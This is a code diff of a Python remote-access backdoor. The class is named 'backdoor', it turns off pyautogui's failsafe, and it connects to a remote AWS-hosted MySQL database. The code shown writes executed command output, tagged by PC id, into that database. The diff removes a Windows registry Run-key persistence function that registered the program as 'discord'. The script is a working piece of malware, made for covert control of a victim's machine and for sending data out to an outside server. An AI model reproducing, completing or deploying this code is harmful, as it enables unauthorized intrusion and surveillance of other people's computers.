@@ -1,16 +1,8 @@
-import mysql.connector,socket,os,time,datetime,keyboard,winreg,pyautogui,webbrowser
-
+import mysql.connector,socket,os,time,datetime,keyboard,pyautogui,webbrowser
 
 pyautogui.FAILSAFE = False
 class backdoor:
     def __init__(self):
-        # hard_drive_name = os.getcwd().split(":")
-        # hard_drive_name = hard_drive_name[0]
-        # if not os.path.exists(hard_drive_name+":/windows/system32/main.exe"):
-        #     #os.chdir(hard_drive_name+":/windows/system32")
-        #     shutil.copy("main.exe", hard_drive_name+":/windows/system32/main.exe")
-
-        self.set_autostart_registry('discord', 'main.exe')
 
         self.db = mysql.connector.connect(
             host="database.cun6wzt30wpz.us-west-1.rds.amazonaws.com",
@@ -217,22 +209,8 @@ class backdoor:
                       VALUES (%s,%s,%s,%s)
                 """
                 self.cursor.execute(sql_code, (command[1], output, self.pc_id,datetime.datetime.now()))
-                self.db.commit()
-    def set_autostart_registry(self, app_name, key_data=None, autostart: bool = True) -> bool:
-        with winreg.OpenKey(
-                key=winreg.HKEY_CURRENT_USER,
-                sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
-                reserved=0,
-                access=winreg.KEY_ALL_ACCESS,
-        ) as key:
-            try:
-                if autostart:
-                    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
-                else:
-                    winreg.DeleteValue(key, app_name)
-            except OSError:
-                return False
-        return True                
+                self.db.commit()      
+
 backdoor()
 
 
